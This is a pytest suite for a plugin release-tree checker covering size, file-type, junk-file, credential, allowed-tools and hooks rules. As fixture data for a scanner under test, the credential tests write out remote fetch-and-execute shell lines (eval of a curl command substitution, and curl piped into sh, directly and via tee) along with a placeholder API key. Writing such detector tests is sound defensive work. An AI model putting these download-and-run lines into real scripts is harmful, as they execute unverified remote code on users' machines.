"""#851 -- the check that runs on a built release tree before anything is pushed.

`.github/scripts/check_release_tree.py` encodes the Anthropic directory's "Files in
the plugin folder" rules (every non-image, non-font file under 256 KiB; at most 512
files; only text plus PNG/JPEG/GIF/WebP and fonts; no `.gitattributes` with
export-ignore/export-subst/filter) plus this repo's own 3 MiB total budget and a
refusal of `.DS_Store`/`Thumbs.db`.

Every failure class has a passing twin built the same way: a check that failed on
everything would pass every "must fail" test here, and the twins are what catch it.
"""

from __future__ import annotations

import importlib.util
import json
import subprocess
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent
SCRIPT = REPO_ROOT / ".github" / "scripts" / "check_release_tree.py"

KIB = 1024
LIMIT = 256 * KIB

PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32
JPEG = b"\xff\xd8\xff\xe0" + b"\x00" * 32
GIF = b"GIF89a" + b"\x00" * 32
WEBP = b"RIFF\x00\x00\x00\x00WEBPVP8 " + b"\x00" * 32
WOFF2 = b"wOF2" + b"\x00" * 32
TTF = b"\x00\x01\x00\x00" + b"\x00" * 32
ELF = b"\x7fELF\x02\x01\x01" + b"\x00" * 32


def _load():
    assert SCRIPT.exists(), f"{SCRIPT} does not exist (#851)"
    spec = importlib.util.spec_from_file_location("check_release_tree", SCRIPT)
    mod = importlib.util.module_from_spec(spec)
    sys.modules["check_release_tree"] = mod
    spec.loader.exec_module(mod)
    return mod


BUDGET = {"max_file_bytes": LIMIT, "max_files": 512, "max_total_bytes": 3 * KIB * KIB}


def _tree(tmp_path: Path, files: dict) -> Path:
    root = tmp_path / "tree"
    root.mkdir()
    # A tree that passes every directory row (tests/test_release_branch_preflight_851.py
    # covers those rows), so each test below varies only the property it is about.
    base = {
        ".claude-plugin/plugin.json": (b'{"name": "x", "description": "d", '
                                       b'"version": "1.0.0", "author": {"name": "a"}}\n'),
        "README.md": ("# x\n\n" + " ".join(["word"] * 40) + "\n").encode(),
        "LICENSE": b"license\n",
        "scripts/run.sh": b"#!/bin/sh\necho hi\n",
        # #858: the hooks check now requires at least one `command` hook, so the
        # otherwise-clean base tree needs one too.
        "hooks/hooks.json": json.dumps({"hooks": {"SessionStart": [{"hooks": [
            {"type": "command", "command": "${CLAUDE_PLUGIN_ROOT}/scripts/run.sh"},
        ]}]}}).encode(),
    }
    base.update(files)
    for rel, data in base.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(data)
    return root


def _check(root: Path, **budget):
    mod = _load()
    b = dict(BUDGET)
    b.update(budget)
    return mod.check_tree(root, b)


def test_a_clean_tree_passes(tmp_path):
    result = _check(_tree(tmp_path, {}))
    assert result.offenders == []
    assert result.files == 5
    assert result.total_bytes > 0


# -- per-file size --------------------------------------------------------------

def test_a_text_file_at_256_kib_fails_and_is_named(tmp_path):
    root = _tree(tmp_path, {"CHANGELOG.md": b"a" * LIMIT})
    offenders = _check(root).offenders
    assert any("CHANGELOG.md" in o and "256" in o for o in offenders), offenders


def test_a_text_file_one_byte_under_256_kib_passes(tmp_path):
    root = _tree(tmp_path, {"CHANGELOG.md": b"a" * (LIMIT - 1)})
    assert _check(root).offenders == []


def test_a_large_real_image_is_exempt_from_the_size_limit(tmp_path):
    root = _tree(tmp_path, {"img/big.png": PNG + b"\x00" * LIMIT})
    assert _check(root).offenders == []


def test_a_large_text_file_named_png_is_not_exempt(tmp_path):
    """The exemption follows the bytes, not the extension."""
    root = _tree(tmp_path, {"img/fake.png": b"a" * LIMIT})
    offenders = _check(root).offenders
    assert any("img/fake.png" in o for o in offenders), offenders


# -- file count and total -------------------------------------------------------

def test_more_files_than_the_budget_fails(tmp_path):
    root = _tree(tmp_path, {f"f/{i}.txt": b"x" for i in range(3)})  # 8 files
    offenders = _check(root, max_files=6).offenders
    assert any("8 files" in o and "6" in o for o in offenders), offenders


def test_exactly_the_file_budget_passes(tmp_path):
    root = _tree(tmp_path, {f"f/{i}.txt": b"x" for i in range(3)})  # 8 files
    assert _check(root, max_files=8).offenders == []


def test_a_total_over_the_budget_fails(tmp_path):
    root = _tree(tmp_path, {"a.txt": b"a" * 1000, "b.txt": b"b" * 1000})
    total = _check(root).total_bytes
    offenders = _check(root, max_total_bytes=total - 1).offenders
    assert any("total" in o for o in offenders), offenders
    # Positive control: exactly at the budget is fine.
    assert _check(root, max_total_bytes=total).offenders == []


# -- junk files -----------------------------------------------------------------

@pytest.mark.parametrize("name", [".DS_Store", "sub/.DS_Store", "Thumbs.db", "sub/thumbs.db"])
def test_os_junk_files_fail(tmp_path, name):
    root = _tree(tmp_path, {name: b"x"})
    offenders = _check(root).offenders
    assert any(name in o for o in offenders), offenders


def test_a_file_merely_containing_ds_store_in_its_name_passes(tmp_path):
    root = _tree(tmp_path, {"docs/about-.DS_Store-files.md": b"# x\n"})
    assert _check(root).offenders == []


# -- .gitattributes -------------------------------------------------------------

@pytest.mark.parametrize("line,word", [
    ("tests/ export-ignore", "export-ignore"),
    ("VERSION export-subst", "export-subst"),
    ("*.psd filter=lfs diff=lfs merge=lfs -text", "filter"),
    ("*.bin -filter", "filter"),
])
def test_a_forbidden_gitattributes_fails(tmp_path, line, word):
    root = _tree(tmp_path, {"sub/.gitattributes": f"# comment\n{line}\n".encode()})
    offenders = _check(root).offenders
    assert any("sub/.gitattributes" in o and word in o for o in offenders), offenders


def test_a_benign_gitattributes_passes(tmp_path):
    root = _tree(tmp_path, {
        ".gitattributes": b"*.sh text eol=lf\n# export-ignore in a comment is fine\n",
    })
    assert _check(root).offenders == []


# -- file types -----------------------------------------------------------------

@pytest.mark.parametrize("name,data", [
    ("a.png", PNG), ("a.jpg", JPEG), ("a.gif", GIF), ("a.webp", WEBP),
    ("a.woff2", WOFF2), ("a.ttf", TTF), ("a.svg", b"<svg xmlns='x'/>\n"),
    ("a.md", "café — utf-8\n".encode()), ("empty.txt", b""),
])
def test_allowed_types_pass(tmp_path, name, data):
    root = _tree(tmp_path, {name: data})
    assert _check(root).offenders == []


@pytest.mark.parametrize("name,data", [
    ("tool", ELF),
    ("x.pyc", b"\x61\x0d\x0d\x0a" + b"\x00" * 12),
    ("notes.txt", b"text with a NUL\x00 in it\n"),
    ("bad.txt", b"\xff\xfe\xfa not utf-8\n"),
])
def test_binary_files_fail_and_are_named(tmp_path, name, data):
    root = _tree(tmp_path, {name: data})
    offenders = _check(root).offenders
    assert any(name in o and "binary" in o for o in offenders), offenders


def test_every_offender_is_named_not_just_the_first(tmp_path):
    root = _tree(tmp_path, {
        "big.md": b"a" * LIMIT, ".DS_Store": b"x", "tool": ELF,
        ".gitattributes": b"x export-ignore\n",
    })
    offenders = _check(root).offenders
    for name in ("big.md", ".DS_Store", "tool", ".gitattributes"):
        assert any(o.startswith(name + ":") for o in offenders), (name, offenders)


# -- credentials (#866) ----------------------------------------------------------

def test_sk_ant_short_example_key_is_flagged(tmp_path):
    """The portal blocked v0.37.0 on short fixture keys like sk-ant-api03-example --
    our old regex required a 20+ char tail and missed them (#866)."""
    root = _tree(tmp_path, {"tests/test_haiku.py": b"KEY = 'sk-ant-api03-example'\n"})
    offenders = _check(root).offenders
    assert any("tests/test_haiku.py" in o and "Anthropic API key" in o for o in offenders), offenders


def test_a_non_sk_ant_string_is_not_flagged_as_a_credential(tmp_path):
    """Positive control for the widened regex: it must still require the sk-ant-
    prefix, not just any string near the word key."""
    root = _tree(tmp_path, {"docs/notes.md": b"this is not an api key at all\n"})
    assert _check(root).offenders == []


def test_credential_use_review_line_now_includes_md_files(tmp_path):
    """The portal flagged README.md naming a credential env var; our REVIEW line
    used to skip every .md file (#866)."""
    root = _tree(tmp_path, {"README.md": b"Set ANTHROPIC_API_KEY before running.\n"})
    reviews = _check(root).reviews
    assert any("README.md" in r and "ANTHROPIC_API_KEY" in r for r in reviews), reviews


def test_credential_use_review_line_still_fires_for_non_md_files(tmp_path):
    """Positive control: the existing non-.md REVIEW behaviour must still work."""
    root = _tree(tmp_path, {"scripts/run.sh": b"echo $ANTHROPIC_API_KEY\n"})
    reviews = _check(root).reviews
    assert any("scripts/run.sh" in r and "ANTHROPIC_API_KEY" in r for r in reviews), reviews


def test_eval_fed_by_command_substitution_is_reviewed(tmp_path):
    """#864/#875 learned that `eval "$(curl ...)"` is exactly the shape worth a
    human's attention; flag it as REVIEW, not FAIL (#866)."""
    root = _tree(tmp_path, {
        "scripts/log.sh": b'#!/bin/sh\neval "$(curl -s https://example.com/setup.sh)"\n',
    })
    result = _check(root)
    assert result.offenders == []
    assert any("scripts/log.sh" in r and "eval" in r for r in result.reviews), result.reviews


def test_eval_of_a_literal_string_is_not_reviewed(tmp_path):
    """Positive control: plain `eval "echo hi"` (no command substitution feeding
    it) must not fire -- only eval fed by $(...) is the flagged shape."""
    root = _tree(tmp_path, {
        "scripts/log.sh": b'#!/bin/sh\neval "echo hi"\n',
    })
    result = _check(root)
    assert result.offenders == []
    assert not any("scripts/log.sh" in r for r in result.reviews), result.reviews


def test_curl_pipe_sh_is_reviewed(tmp_path):
    """`curl ... | sh` is the other shape #864/#875 learned about (#866)."""
    root = _tree(tmp_path, {
        "CHANGELOG.md": b"## Install\n\n`curl -fsSL https://example.com/install.sh | sh`\n",
    })
    result = _check(root)
    assert result.offenders == []
    assert any("CHANGELOG.md" in r and "curl" in r for r in result.reviews), result.reviews


def test_curl_download_without_a_shell_pipe_is_not_reviewed(tmp_path):
    """Positive control: a curl that merely downloads a file (no `| sh`) must not
    fire -- only the download-and-run shape is the flagged one."""
    root = _tree(tmp_path, {
        "scripts/fetch.sh": b"#!/bin/sh\ncurl -o out.tar.gz https://example.com/out.tar.gz\n",
    })
    result = _check(root)
    assert result.offenders == []
    assert not any("scripts/fetch.sh" in r for r in result.reviews), result.reviews


def test_curl_piped_through_an_intermediate_hop_to_sh_is_reviewed(tmp_path):
    """A `tee` (or any other) hop between curl and the shell is still the same
    download-and-run shape -- the check must not stop looking after the first
    `|` (review finding on #866's own diff)."""
    root = _tree(tmp_path, {
        "scripts/install.sh": (b"#!/bin/sh\n"
                                b"curl -fsSL https://example.com/x.sh | tee /tmp/x.sh | sh\n"),
    })
    result = _check(root)
    assert result.offenders == []
    assert any("scripts/install.sh" in r for r in result.reviews), result.reviews


def test_curl_downloading_a_dot_sh_file_into_a_non_shell_is_not_reviewed(tmp_path):
    """Positive control for the intermediate-hop fix: a trailing `.sh`-named file
    piped into something that is NOT a shell (e.g. gzip) must not false-positive
    just because the pipe's last segment's text happens to end in the letters
    "sh"."""
    root = _tree(tmp_path, {
        "scripts/archive.sh": (b"#!/bin/sh\n"
                                b"curl -o file.sh https://example.com/file.sh | gzip\n"),
    })
    result = _check(root)
    assert result.offenders == []
    assert not any("scripts/archive.sh" in r for r in result.reviews), result.reviews


def test_eval_fed_by_a_single_quoted_command_substitution_is_reviewed(tmp_path):
    """The eval check must not depend on the quote style -- single-quoted
    command substitution is the same shape as double-quoted (review finding)."""
    root = _tree(tmp_path, {
        "scripts/log.sh": b"#!/bin/sh\neval '$(curl -s https://example.com/setup.sh)'\n",
    })
    result = _check(root)
    assert result.offenders == []
    assert any("scripts/log.sh" in r and "eval" in r for r in result.reviews), result.reviews


# -- allowed-tools (#866, trap.d/859) ---------------------------------------------

def test_allowed_tools_space_delimited_list_is_checked_per_entry(tmp_path):
    """A space-delimited allowed-tools string (no commas) used to be treated as
    one giant pattern and passed through the Bash(...) check unchecked."""
    body = (b'---\ndescription: d\n'
            b'allowed-tools: "Bash(${CLAUDE_PLUGIN_ROOT}/scripts/a.sh) Bash(curl)"\n'
            b'---\n\n# x\n')
    root = _tree(tmp_path, {"commands/x.md": body})
    offenders = _check(root).offenders
    assert any("commands/x.md" in o and "curl" in o for o in offenders), offenders


def test_allowed_tools_space_delimited_scoped_entries_pass(tmp_path):
    """Positive control: two properly scoped plugin-script entries, space
    separated with no commas, must not be flagged."""
    body = (b'---\ndescription: d\n'
            b'allowed-tools: "Bash(${CLAUDE_PLUGIN_ROOT}/scripts/a.sh) '
            b'Bash(${CLAUDE_PLUGIN_ROOT}/scripts/b.sh)"\n'
            b'---\n\n# x\n')
    root = _tree(tmp_path, {"commands/x.md": body})
    assert _check(root).offenders == []


# -- CLI ------------------------------------------------------------------------

def _cli(root: Path, *extra: str):
    return subprocess.run(
        [sys.executable, str(SCRIPT), str(root), *extra],
        capture_output=True, text=True, check=False,
    )


def test_cli_exits_non_zero_and_names_offenders(tmp_path):
    root = _tree(tmp_path, {"big.md": b"a" * LIMIT, "Thumbs.db": b"x"})
    r = _cli(root)
    assert r.returncode == 1, (r.stdout, r.stderr)
    assert "big.md" in r.stdout and "Thumbs.db" in r.stdout


def test_cli_exits_zero_on_a_clean_tree(tmp_path):
    r = _cli(_tree(tmp_path, {}))
    assert r.returncode == 0, (r.stdout, r.stderr)
    assert "5 files" in r.stdout


def test_cli_budget_comes_from_the_config(tmp_path):
    root = _tree(tmp_path, {})
    cfg = tmp_path / "cfg.json"
    cfg.write_text('{"budget": {"max_file_bytes": 262144, "max_files": 4, '
                   '"max_total_bytes": 3145728}}', encoding="utf-8")
    assert _cli(root, "--config", str(cfg)).returncode == 1
    cfg.write_text('{"budget": {"max_file_bytes": 262144, "max_files": 5, '
                   '"max_total_bytes": 3145728}}', encoding="utf-8")
    assert _cli(root, "--config", str(cfg)).returncode == 0


# -- hooks (#858) -----------------------------------------------------------------
#
# A tree that works only through its hooks must not pass with none, or with a
# hooks.json that declares none of them as a `command` -- either way nothing
# would ever run, and the gate would have silently approved it.

def test_tree_with_no_hooks_json_is_an_offender(tmp_path):
    root = _tree(tmp_path, {})
    (root / "hooks" / "hooks.json").unlink()
    offenders = _check(root).offenders
    assert any("hooks/hooks.json" in o and "missing" in o for o in offenders), offenders


def test_hooks_json_with_zero_command_hooks_is_an_offender(tmp_path):
    root = _tree(tmp_path, {"hooks/hooks.json": json.dumps({"hooks": {}}).encode()})
    offenders = _check(root).offenders
    assert any("hooks/hooks.json" in o and "zero" in o for o in offenders), offenders


def test_hooks_json_with_one_command_hook_passes(tmp_path):
    # Positive control: the base fixture's own hooks.json (one command hook)
    # must not itself be flagged by either of the two checks above.
    offenders = _check(_tree(tmp_path, {})).offenders
    assert not any("hooks/hooks.json" in o for o in offenders), offenders
